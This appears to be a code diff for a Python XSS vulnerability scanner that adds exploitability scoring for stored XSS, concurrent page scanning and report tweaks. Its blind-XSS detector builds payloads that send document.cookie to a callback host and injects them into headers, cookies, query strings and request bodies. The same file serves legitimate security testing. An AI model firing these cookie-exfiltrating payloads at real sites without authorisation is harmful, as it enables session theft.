+                        type="stored",
+                        url=url,
+                        method=form['method'],
+                        parameter="form_submission",
+                        payload=payload,
+                        evidence="Stored payload retrieved on subsequent request",
+                        confidence=confidence,
+                        severity=severity,
+                        cwe=["CWE-79"],
+                        context={
+                            "form_action": form['action'],
+                            "form_fields": list(form_data.keys()),
+                            "browser_execution": exploitable,
+                            "csp": security["csp"].summary(),
+                            "trusted_types": security["trusted_types"],
+                            "framework_sinks": security["frameworks"]
+                        }
+                    )
+
+                    vulnerabilities.append(vuln)
+
 
             except Exception as e:
                 logging.debug(f"Form test failed: {e}")
@@ -2469,20 +2808,44 @@ class StoredXSSDetector:
 
                     if response.status_code in [200, 201, 302]:
                         # Check if comment appears on page
-                        if self.is_payload_stored(payload, url, http_client):
-                            vuln = Vulnerability(
-                                id=hashlib.md5(f"comment:{endpoint}".encode()).hexdigest()[:16],
-                                type="stored",
-                                url=endpoint,
-                                method="POST",
-                                parameter="comment",
-                                payload=payload,
-                                evidence="Comment system stores XSS payload",
-                                confidence=0.7,
-                                severity="high",
-                                cwe=["CWE-79"]
-                            )
-                            vulnerabilities.append(vuln)
+                        if not self.is_payload_stored(payload, url, http_client):
+                            continue
+
+                            # 🔐 STEP 1: fetch page & analyze security
+                        page_response = http_client.get(url)
+                        security = self._extract_stored_security_context(page_response)
+
+                        # 🔥 STEP 2: exploitability gate
+                        exploitable = (
+                                not security["csp"].blocks_inline()
+                                and not security["trusted_types"]
+                                and self._verify_stored_execution(url, payload)
+                        )
+
+                        # 🎯 STEP 3: severity & confidence
+                        severity = "high" if exploitable else "informational"
+                        confidence = 0.9 if exploitable else 0.3
+
+                        vuln = Vulnerability(
+                            id=hashlib.md5(f"comment:{endpoint}".encode()).hexdigest()[:16],
+                            type="stored",
+                            url=endpoint,
+                            method="POST",
+                            parameter="comment",
+                            payload=payload,
+                            evidence="Comment payload stored and retrievable",
+                            confidence=confidence,
+                            severity=severity,
+                            cwe=["CWE-79"],
+                            context={
+                                "browser_execution": exploitable,
+                                "csp": security["csp"].summary(),
+                                "trusted_types": security["trusted_types"],
+                                "framework_sinks": security["frameworks"]
+                            }
+                        )
+
+                        vulnerabilities.append(vuln)
 
                 except Exception as e:
                     logging.debug(f"Comment test failed for {endpoint}: {e}")
@@ -2524,6 +2887,20 @@ class StoredXSSDetector:
                         profile_response = http_client.get(profile_page)
 
                         if payload in profile_response.text:
+                            # 🔐 STEP 1: analyze security context
+                            security = self._extract_stored_security_context(profile_response)
+
+                            # 🔥 STEP 2: exploitability check
+                            exploitable = (
+                                    not security["csp"].blocks_inline()
+                                    and not security["trusted_types"]
+                                    and self._verify_stored_execution(profile_page, payload)
+                            )
+
+                            # 🎯 STEP 3: severity & confidence
+                            severity = "high" if exploitable else "informational"
+                            confidence = 0.9 if exploitable else 0.3
+
                             vuln = Vulnerability(
                                 id=hashlib.md5(f"profile:{endpoint}".encode()).hexdigest()[:16],
                                 type="stored",
@@ -2531,11 +2908,18 @@ class StoredXSSDetector:
                                 method="POST",
                                 parameter="profile_field",
                                 payload=payload,
-                                evidence="Profile field stores XSS payload",
-                                confidence=0.8,
-                                severity="high",
-                                cwe=["CWE-79"]
+                                evidence="Profile field stores payload",
+                                confidence=confidence,
+                                severity=severity,
+                                cwe=["CWE-79"],
+                                context={
+                                    "browser_execution": exploitable,
+                                    "csp": security["csp"].summary(),
+                                    "trusted_types": security["trusted_types"],
+                                    "framework_sinks": security["frameworks"]
+                                }
                             )
+
                             vulnerabilities.append(vuln)
 
                 except Exception as e:
@@ -2588,153 +2972,155 @@ class StoredXSSDetector:
             return False
 
 
+
+
+
 class BlindXSSDetector:
-    """Detect blind XSS vulnerabilities"""
+    """Detect blind XSS vulnerabilities (single-payload model)"""
 
     def __init__(self, config: ScannerConfig = None):
         self.config = config or ScannerConfig()
         self.payload_generator = XSSPayloadGenerator()
-        self.collaborator_url = "127.0.0.1:8008"  # Would be set to actual collaborator
+        self.collaborator_url = "127.0.0.1:8008"  # replace with real OOB server
 
     def test(self, url: str, http_client: AdvancedHTTPClient,
              payload_generator: 'XSSPayloadGenerator') -> List[Vulnerability]:
-        """Test for blind XSS"""
+        """Test for blind XSS using a single correlated payload"""
+
         vulnerabilities = []
 
-        # Test with payloads that would trigger if executed
-        payloads = payload_generator.get_blind_payloads()
+        # --------------------------------------------------
+        # Generate ONE payload + ONE unique ID
+        # --------------------------------------------------
+        payload, uid = self.generate_collaborator_payload(self.collaborator_url)
 
-        for payload in payloads[:self.config.payload_count]:
-            try:
-                # Test in various contexts
-                contexts_tested = self.test_blind_contexts(url, payload, http_client)
+        try:
+            contexts_tested = self.test_blind_contexts(url, payload, http_client)
 
-                if contexts_tested:
-                    # Create vulnerability (would need collaborator to verify)
-                    vuln = Vulnerability(
-                        id=hashlib.md5(f"blind:{url}:{payload[:20]}".encode()).hexdigest()[:16],
-                        type="blind",
-                        url=url,
-                        method="GET",
-                        parameter="multiple",
-                        payload=payload,
-                        evidence="Blind XSS payload submitted",
-                        confidence=0.3,  # Low without collaborator verification
-                        severity="medium",
-                        cwe=["CWE-79"],
-                        context={
-                            "contexts_tested": contexts_tested,
-                            "requires_collaborator": True
-                        }
-                    )
-                    vulnerabilities.append(vuln)
+            if contexts_tested:
+                vuln = Vulnerability(
+                    id=hashlib.md5(f"blind:{url}:{uid}".encode()).hexdigest()[:16],
+                    type="blind",
+                    url=url,
+                    method="MULTIPLE",
+                    parameter="multiple",
+                    payload=payload,
+                    evidence="Blind XSS payload submitted (awaiting OOB callback)",
+                    confidence=0.2,
+                    severity="informational",
+                    cwe=["CWE-79"],
+                    context={
+                        "contexts_tested": contexts_tested,
+                        "collaborator_id": uid,
+                        "collaborator_url": self.collaborator_url,
+                        "callback_observed": False,
+                        "requires_oob_confirmation": True,
+                        "triage_note": (
+                            "Blind XSS requires out-of-band interaction. "
+                            "No callback observed during scan window."
+                        )
+                    }
+                )
+                vulnerabilities.append(vuln)
 
-            except Exception as e:
-                logging.debug(f"Blind XSS test failed: {e}")
+        except Exception as e:
+            logging.debug(f"Blind XSS test failed: {e}")
 
         return vulnerabilities
 
+    # --------------------------------------------------
+    # Payload generation (SINGLE PAYLOAD)
+    # --------------------------------------------------
+    def generate_collaborator_payload(self, collaborator_url: str):
+        """
+        Generate one blind-XSS payload with a unique correlation ID
+        """
+        unique_id = hashlib.md5(str(time.time()).encode()).hexdigest()[:8]
+
+        payload = (
+            f"<img src=x onerror=\"new Image().src='http://{collaborator_url}/{unique_id}"
+            f"?c='+document.cookie\">"
+        )
+
+        return payload, unique_id
+
+    # --------------------------------------------------
+    # Blind injection points
+    # --------------------------------------------------
     def test_blind_contexts(self, url: str, payload: str,
                             http_client: AdvancedHTTPClient) -> List[str]:
-        """Test payload in different blind XSS contexts"""
+        """Inject payload into all realistic blind XSS sinks"""
+
         contexts_tested = []
 
-        # Test in User-Agent
         try:
-            headers = {'User-Agent': payload}
-            response = http_client.get(url, headers=headers)
-            if response.status_code < 500:  # Successful request
-                contexts_tested.append('User-Agent')
-        except:
-            pass
-
-        # Test in Referer
-        try:
-            headers = {'Referer': payload}
-            response = http_client.get(url, headers=headers)
+            response = http_client.get(url, headers={"User-Agent": payload})
             if response.status_code < 500:
-                contexts_tested.append('Referer')
+                contexts_tested.append("User-Agent")
         except:
             pass
 
-        # Test in cookies
         try:
-            http_client.session.cookies.set('XSS_Test', payload)
+            response = http_client.get(url, headers={"Referer": payload})
+            if response.status_code < 500:
+                contexts_tested.append("Referer")
+        except:
+            pass
+
+        try:
+            http_client.session.cookies.set("XSS_Test", payload)
             response = http_client.get(url)
             if response.status_code < 500:
-                contexts_tested.append('Cookie')
+                contexts_tested.append("Cookie")
         except:
             pass
 
-        # Test in X-Forwarded-For
         try:
-            headers = {'X-Forwarded-For': payload}
-            response = http_client.get(url, headers=headers)
+            response = http_client.get(url, headers={"X-Forwarded-For": payload})
             if response.status_code < 500:
-                contexts_tested.append('X-Forwarded-For')
+                contexts_tested.append("X-Forwarded-For")
         except:
             pass
 
-        # Test in query parameters
         try:
-            test_url = f"{url}?test={payload}"
-            response = http_client.get(test_url)
+            response = http_client.get(f"{url}?test={payload}")
             if response.status_code < 500:
-                contexts_tested.append('Query-Parameter')
+                contexts_tested.append("Query-Parameter")
         except:
             pass
 
-        # Test in form data
         try:
-            form_data = {'input': payload, 'comment': payload, 'search': payload}
-            response = http_client.post(url, data=form_data)
+            response = http_client.post(url, data={"input": payload})
             if response.status_code < 500:
-                contexts_tested.append('Form-Data')
+                contexts_tested.append("Form-Data")
         except:
             pass
 
-        # Test in JSON body
         try:
-            json_data = {'data': payload, 'query': payload, 'filter': payload}
-            response = http_client.post(url, json=json_data)
+            response = http_client.post(url, json={"data": payload})
             if response.status_code < 500:
-                contexts_tested.append('JSON-Body')
+                contexts_tested.append("JSON-Body")
         except:
             pass
 
         return contexts_tested
 
-    def setup_collaborator(self):
-        """Setup collaborator server for blind XSS testing"""
-        # This would integrate with services like Burp Collaborator,
-        # Interactsh, or self-hosted callback server
+    # --------------------------------------------------
+    # OOB verification hook (used later, not during scan)
+    # --------------------------------------------------
+    def verify_blind_callback(self, collaborator_client, unique_id: str) -> bool:
+        """
+        Check collaborator logs for interaction
+        """
+        try:
+            interactions = collaborator_client.poll()
+            for event in interactions:
+                if unique_id in event.get("request", ""):
+                    return True
+        except Exception:
+            pass
+        return False
 
-        collaborator_config = {
-            'type': 'dns',  # or http, https, smtp
-            'server': None,  # Would be set to actual server
-            'poll_interval': 5,
-            'timeout': 60
-        }
-
-        return collaborator_config
-
-    def generate_collaborator_payload(self, collaborator_url: str) -> str:
-        """Generate payload with collaborator callback"""
-        if not collaborator_url:
-            return "<script>alert('XSS')</script>"
-
-        # Generate unique identifier
-        unique_id = hashlib.md5(str(time.time()).encode()).hexdigest()[:8]
-
-        # Create payload that calls back to collaborator
-        payloads = [
-            f"<script>fetch('http://{collaborator_url}/{unique_id}?c='+document.cookie)</script>",
-            f"<img src=x onerror=\"new Image().src='http://{collaborator_url}/{unique_id}?d='+document.domain\">",
-            f"<script>navigator.sendBeacon('http://{collaborator_url}/{unique_id}', document.cookie)</script>",
-            f"<link rel='ping' href='http://{collaborator_url}/{unique_id}'>"
-        ]
-
-        return payloads[0]  # Return first payload
 
 
 # ============================================================================
@@ -3077,16 +3463,28 @@ class AdvancedXSSScanner:
         return f"xssscan_{timestamp}_{random_str}"
 
     def setup_logging(self):
-        """Setup logging configuration"""
+        """Setup logging configuration - IMPROVED"""
         log_level = logging.DEBUG if self.config.debug else logging.INFO
+
+        # Create logs directory
+        log_dir = "scan_logs"
+        os.makedirs(log_dir, exist_ok=True)
+
+        log_file = os.path.join(log_dir, f"{self.results.scan_id}.log")
+
         logging.basicConfig(
             level=log_level,
             format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
             handlers=[
-                logging.FileHandler(f"{self.results.scan_id}.log"),
+                logging.FileHandler(log_file, encoding='utf-8'),
                 logging.StreamHandler()
             ]
         )
+
+        # Reduce verbosity of some noisy libraries
+        logging.getLogger("urllib3").setLevel(logging.WARNING)
+        logging.getLogger("selenium").setLevel(logging.WARNING)
+        logging.getLogger("requests").setLevel(logging.WARNING)
 
     def scan(self, target_url: str) -> ScanResult:
         """Main scan method"""
@@ -3101,11 +3499,63 @@ class AdvancedXSSScanner:
             self.results.pages = pages
             self.results.pages_scanned = len(pages)
 
+            if not pages:
+                logging.warning("No pages found to scan")
+                return self.results
+
             # Phase 2: Vulnerability detection
             logging.info("Phase 2: Testing for XSS vulnerabilities...")
             vulnerabilities = []
 
+            semaphore = threading.Semaphore(self.config.max_concurrent)
+
+            def scan_page(page):
+                """Scan a single page with semaphore"""
+                with semaphore:
+                    try:
+                        page_vulns = self.detection_engine.analyze_url(
+                            page.url, page, self.http_client
+                        )
+                        return page_vulns
+                    except Exception as e:
+                        logging.error(f"Error scanning {page.url}: {e}")
+                        return []
+
+            # Process pages with progress tracking
+            total_pages = min(len(pages), self.config.max_pages)
+            processed_pages = 0
+
             with ThreadPoolExecutor(max_workers=self.config.max_concurrent) as executor:
+                # Submit all tasks
+                future_to_page = {
+                    executor.submit(scan_page, page): page
+                    for page in pages[:self.config.max_pages]
+                }
+
+                # Process results as they complete
+                for future in as_completed(future_to_page):
+                    processed_pages += 1
+                    page = future_to_page[future]
+
+                    try:
+                        page_vulns = future.result(timeout=60)
+                        vulnerabilities.extend(page_vulns)
+
+                        if page_vulns:
+                            logging.info(f"Page {processed_pages}/{total_pages}: Found {len(page_vulns)} on {page.url}")
+                        else:
+                            logging.debug(f"Page {processed_pages}/{total_pages}: No vulnerabilities on {page.url}")
+
+                        # Progress update every 10 pages
+                        if processed_pages % 10 == 0:
+                            logging.info(f"Progress: {processed_pages}/{total_pages} pages scanned")
+
+                    except TimeoutError:
+                        logging.warning(f"Scan for {page.url} timed out")
+                    except Exception as e:
+                        logging.error(f"Failed to get result for {page.url}: {e}")
+
+            '''with ThreadPoolExecutor(max_workers=self.config.max_concurrent) as executor:
                 future_to_url = {
                     executor.submit(self.detection_engine.analyze_url, page.url,page, self.http_client): page.url
                     for page in pages[:self.config.max_pages]
@@ -3118,7 +3568,7 @@ class AdvancedXSSScanner:
                         vulnerabilities.extend(page_vulns)
                         logging.info(f"Found {len(page_vulns)} (Possibility) vulnerabilities on {url}")
                     except Exception as e:
-                        logging.error(f"Error scanning {url}: {e}")
+                        logging.error(f"Error scanning {url}: {e}")'''
 
             #self.results.vulnerabilities = self.deduplicate_vulnerabilities(vulnerabilities)
             #self.results.vulnerabilities = self.smart_deduplicate(vulnerabilities)
@@ -3478,6 +3928,8 @@ class ReportGenerator:
 
                 <h2>🛡️ WAF Detection</h2>
                 <p>{waf_status}</p>
+                
+                <span class="highlight" style="background: #fff3cd;color: #664d03;padding: 2px 6px;border-radius: 4px;font-weight: 600;"><strong><em>* Ignore all Informative Vulnerabilities *</em></strong></span>
 
                 <div class="filter-bar">
                         <label for="vulnFilter">Show:</label>
